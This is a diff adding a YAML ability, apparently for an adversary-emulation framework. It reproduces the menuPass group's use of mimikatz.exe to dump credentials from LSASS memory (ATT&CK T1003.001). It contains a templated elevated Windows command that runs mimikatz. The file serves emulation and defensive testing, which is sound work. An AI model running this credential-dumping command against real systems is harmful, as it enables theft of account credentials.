@@ -1,0 +1,31 @@
+ability_id: ffb50e17-cb3c-4424-a4e7-99e3885f22cc
+access: {}
+additional_info: {}
+buckets:
+- credential-access
+delete_payload: true
+description: menuPass has used mimikatz.exe to dump credentials locally
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: '"#{mimikatz_local_path}\#{mimikatz_arch}\mimikatz.exe" "#{mimikatz_module}"'
+  language: null
+  name: cmd
+  parsers: []
+  payloads:
+  - mimikatz.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: OS Credential Dumping
+plugin: emu
+privilege: Elevated
+repeatable: false
+requirements: []
+singleton: false
+tactic: credential-access
+technique_id: T1003.001
+technique_name: 'OS Credential Dumping: LSASS Memory'
